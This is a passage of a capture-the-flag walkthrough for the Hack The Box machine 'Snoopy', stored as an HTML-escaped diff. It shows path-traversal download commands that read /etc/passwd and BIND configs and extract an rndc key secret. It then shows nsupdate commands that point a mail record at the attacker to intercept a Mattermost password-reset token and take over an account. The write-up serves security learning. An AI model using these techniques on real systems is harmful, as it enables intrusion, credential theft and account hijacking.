+header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Content-Length: &apos;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; filesize&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$archive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+readfile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$archive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$archive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-22.png&quot; alt=&quot;snoopy-22.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;the-hidden-superpower-of-this-exploit&quot;&gt;The Hidden Superpower of this Exploit:&lt;/h4&gt;
+&lt;p&gt;Take a close look at how the backend handles the file retrieval:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$zip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;addFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filecontent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;mf&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;readfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This isn’t just a standard Local File Inclusion (LFI) that prints text to the screen. It is a blind Arbitrary File Download via Zip packaging. This gives us a massive tactical advantage for two reasons:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;No Code Execution via Poisoning:&lt;/strong&gt; Since the application uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readfile()&lt;/code&gt; inside a zip creation loop instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include()&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require()&lt;/code&gt;, we cannot get RCE via standard log poisoning or PHP wrappers.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Binary &amp;amp; Source Integrity:&lt;/strong&gt; Because everything is compressed into a zip archive before transfer, we can download raw binary files (like compiled binaries, SSH keys, or encrypted configurations) and multi-line PHP source files completely cleanly without worrying about character encoding corruption or the web server executing the code before you can read it.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;As we know the project directory structure now, we can verify what we were searching for before (path to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;announcement.pdf&lt;/code&gt;):&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;s1&quot;&gt;&apos;http://snoopy.htb/download?file=....//....//....//....//var/www/html//press_package//announcement.pdf&apos;&lt;/span&gt;
+Warning: Binary output can mess up your terminal. Use &lt;span class=&quot;s2&quot;&gt;&quot;--output -&quot;&lt;/span&gt; to tell curl to output it to your terminal anyway, or consider &lt;span class=&quot;s2&quot;&gt;&quot;--output &amp;lt;FILE&amp;gt;&quot;&lt;/span&gt; to save to a file.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It’s correct, here we go.&lt;/p&gt;
+
+&lt;p&gt;Looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file we can identify multiple users of interest:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
+sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
+clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
+lpelt:x:1003:1004::/home/lpelt:/bin/bash
+cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
+vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
+bind:x:108:113::/var/cache/bind:/usr/sbin/nologin
+_laurel:x:999:998::/var/log/laurel:/bin/false
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;root&lt;/li&gt;
+  &lt;li&gt;www-data&lt;/li&gt;
+  &lt;li&gt;cbrown&lt;/li&gt;
+  &lt;li&gt;sbrown&lt;/li&gt;
+  &lt;li&gt;clamav&lt;/li&gt;
+  &lt;li&gt;lpelt&lt;/li&gt;
+  &lt;li&gt;cschultz&lt;/li&gt;
+  &lt;li&gt;vgray&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Let’s try to download their private ssh keys (maybe we have permissions - unlikely because the webapp is likely running as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; but always worth a shot):&lt;/p&gt;
+
+&lt;p&gt;… Nothing!&lt;/p&gt;
+
+&lt;p&gt;Also tried to check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/environ&lt;/code&gt; and other files including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/stats&lt;/code&gt;, cronjobs, php configs, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env.local&lt;/code&gt; but didn’t find anything - or anything of interest. So we have to think differently this time.&lt;/p&gt;
+
+&lt;p&gt;As we saw at the beginning, DNS is running on port 53 and we were able to perform a zone transfer attack but it didn’t show any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mail.snoopy.htb&lt;/code&gt; subdomain. So what if we read the according config files that allow us to add that dns entry again, what could we find? Let’s find out.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;We have to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;....//....//....//....//....//....//....//....//....//etc/bind/named.conf.local&lt;/code&gt; to check what’s going on:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zone &lt;span class=&quot;s2&quot;&gt;&quot;snoopy.htb&quot;&lt;/span&gt; IN &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;master&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ file &lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/bind/db.snoopy.htb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ allow-update &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; key &lt;span class=&quot;s2&quot;&gt;&quot;rndc-key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ allow-transfer &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; 10.0.0.0/8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allow-update&lt;/code&gt; directive specifies the permissions for making updates to the DNS zone. In this case it requires the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rndc-key&lt;/code&gt;. If we get our hands on that key, we will be able to modify and add DNS entries.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;We have to check the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bind/named.conf&lt;/code&gt; which usually contains the key:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;key &lt;span class=&quot;s2&quot;&gt;&quot;rndc-key&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+ algorithm hmac-sha256&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ secret &lt;span class=&quot;s2&quot;&gt;&quot;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-23.png&quot; alt=&quot;snoopy-23.htb&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Here we go! We have the key &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rndc-key&lt;/code&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=&lt;/code&gt;. Now we should be able to edit the DNS Zone, adding the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mail&lt;/code&gt; vhost and pointing it to our own IP to check out the traffic:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos; &amp;gt; rndc.key
+key &quot;rndc-key&quot; {
+ algorithm hmac-sha256;
+ secret &quot;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=&quot;;
+};
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nsupdate &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; rndc.key
+server 10.129.229.5
+zone snoopy.htb
+update add mail.snoopy.htb. 60 A &amp;lt;YOUR IP&amp;gt;
+send
+quit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-24.png&quot; alt=&quot;snoopy-24.htb&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Verify that the entry exists now via a new zone transfer:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig axfr @snoopy.htb snoopy.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-25.png&quot; alt=&quot;snoopy-25.htb&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Let’s open wireshark and see what’s going on after sending the account password reset request:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-26.png&quot; alt=&quot;snoopy-26.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It looks like the server is really trying to reach out to us. Let’s install &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postfix&lt;/code&gt; which is a lightweight mail transfer agent:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;postfix
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;postconf &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;myhostname = snoopy.htb&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;postconf &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mynetworks = 10.0.0.0/8&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl start postfix &lt;span class=&quot;c&quot;&gt;# use this if on host&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;service postfix start   &lt;span class=&quot;c&quot;&gt;# or this if you&apos;re running in chroot&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now quickly add the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mail&lt;/code&gt; DNS entry (some background script is removing it automatically!) and send the request again:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-27.png&quot; alt=&quot;snoopy-27.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When sending the request by pushing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Reset my Password&lt;/code&gt; button, the response actually took more time which can be confirmed by Wireshark.
+Right now, as you can see, the data in Wireshark is encrypted and we couldn’t look at it (postfix is running in a container for me). We can force &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postfix&lt;/code&gt; to not use encryption:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Disable TLS for incoming connections (SMTP Server)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;postconf &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;smtpd_tls_security_level = none&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Disable TLS for outgoing connections (SMTP Client)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;postconf &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;smtp_tls_security_level = none&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Allow plaintext authentication over unencrypted links (if you are using SMTP auth)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;postconf &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;smtpd_tls_auth_only = no&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl restart postfix &lt;span class=&quot;c&quot;&gt;# use this if on host&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;service postfix restart   &lt;span class=&quot;c&quot;&gt;# or this if you&apos;re running in chroot&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now after resending the request, we can see the following in Wireshark:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-28.png&quot; alt=&quot;snoopy-28.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The server is trying to send a message but the account does not exist on our side. So let’s add the account and see what is sent:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;useradd sbrown &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;sudo touch&lt;/span&gt; /var/mail/sbrown &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;sudo chown &lt;/span&gt;sbrown:sbrown /var/mail/sbrown
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now after reattempting the password reset we should be able to receive the link!
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-29.png&quot; alt=&quot;snoopy-29.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;CASH:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo cat&lt;/span&gt; /var/mail/sbrown
+From no-reply@snoopy.htb  Sat May 16 16:02:49 2026
+Return-Path: &amp;lt;no-reply@snoopy.htb&amp;gt;
+X-Original-To: sbrown@snoopy.htb
+Delivered-To: sbrown@snoopy.htb
+Received: from mm.snoopy.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;snoopy.htb &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.129.229.5]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+	by snoopy.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Postfix&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with UTF8SMTP &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;D9BD617845F
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;sbrown@snoopy.htb&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Sat, 16 May 2026 16:02:48 +0200 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CEST&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+MIME-Version: 1.0
+Reply-To: &lt;span class=&quot;s2&quot;&gt;&quot;No-Reply&quot;&lt;/span&gt; &amp;lt;no-reply@snoopy.htb&amp;gt;
+Date: Sat, 16 May 2026 14:02:49 +0000
+Auto-Submitted: auto-generated
+Precedence: bulk
+Content-Transfer-Encoding: 8bit
+Message-ID: &amp;lt;a4m1t9fzaob1tguy-1778940169@mm.snoopy.htb&amp;gt;
+From: &lt;span class=&quot;s2&quot;&gt;&quot;No-Reply&quot;&lt;/span&gt; &amp;lt;no-reply@snoopy.htb&amp;gt;
+To: sbrown@snoopy.htb
+Subject: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Mattermost] Reset your password
+Content-Type: multipart/alternative&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;boundary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ea630ddd0e7b3690da64f18427e5a47454173f11aef02f100c4329760db7
+
+&lt;span class=&quot;nt&quot;&gt;--ea630ddd0e7b3690da64f18427e5a47454173f11aef02f100c4329760db7&lt;/span&gt;
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
+
+Reset Your Password
+Click the button below to reset your password. If you &lt;span class=&quot;nv&quot;&gt;didn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99t &lt;span class=&quot;nv&quot;&gt;reques&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+t this, you can safely ignore this email.
+
+Reset Password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://mm.snoopy.htb/reset_password_complete?token&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;3Dq1o6j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+aux5bgq948m3ayf4j93hwsan1a4r6xfwp76uysw49tu6mhea7gh94333a3j &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+The password reset &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;expires &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;24 hours.
+
+Questions?
+Need &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;or have questions? Email us at support@snoopy.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; support@snoop&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+y.htb &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;C2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, &lt;span class=&quot;nv&quot;&gt;CA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+, 94301
+&lt;span class=&quot;nt&quot;&gt;--ea630ddd0e7b3690da64f18427e5a47454173f11aef02f100c4329760db7&lt;/span&gt;
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
+
+&amp;lt;SNIP&amp;gt;
+
+&lt;span class=&quot;nt&quot;&gt;--ea630ddd0e7b3690da64f18427e5a47454173f11aef02f100c4329760db7--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s follow the link and reset the password!!
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-30.png&quot; alt=&quot;snoopy-30.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Something’s off. Looks like the sent link is incorrectly formatted (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token=3Dq1o6j=aux5bgq948m3ayf4j93hwsan1a4r6xfwp76uysw49tu6mhea7gh94333a3j&lt;/code&gt;). Changing it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://mm.snoopy.htb/reset_password_complete?token=q1o6jaux5bgq948m3ayf4j93hwsan1a4r6xfwp76uysw49tu6mhea7gh94333a3j&lt;/code&gt; (removed leading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3D&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=&lt;/code&gt;):&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;The =3D component (Literal Equals):&lt;/strong&gt; The hex value for an equals sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=&lt;/code&gt;) in the ASCII table is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3D&lt;/code&gt;. Therefore, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token=3D&lt;/code&gt; literally translates to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token=&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;The lone = component (Soft Line Break):&lt;/strong&gt; Email protocols (like SMTP) have a strict structural limit of 76 characters per line. If a line of text (or a long password reset link) exceeds this limit, the mail server injects a soft line break to wrap the text safely. A soft line break is represented by a single &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=&lt;/code&gt; right at the end of the line. When an email client renders or decodes the message, it automatically deletes that specific &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=&lt;/code&gt; and merges the current line with the next one seamlessly.
+=&amp;gt; That’s why &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://mm.snoopy.htb/reset_password_complete?token=q1o6jaux5bgq948m3ayf4j93hwsan1a4r6xfwp76uysw49tu6mhea7gh94333a3j&lt;/code&gt; is correctly decoded.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;When we browse there and set the password to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tralsesec&lt;/code&gt;, we are indeed able to reset the password. After logging in, we are confronted with this chat:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-31.png&quot; alt=&quot;snoopy-31.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After sending a couple of DMs here and there, no one responded. So I focused on the only chat (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Town Square&lt;/code&gt;) where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sbrown&lt;/code&gt; said:&lt;/p&gt;
+&lt;blockquote class=&quot;info&quot;&gt;
+  &lt;p&gt;Hey everyone, I just created a new channel dedicated to submitting requests for new server provisions as we start to roll out our new DevSecOps tool.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Maybe we should look for that channel.
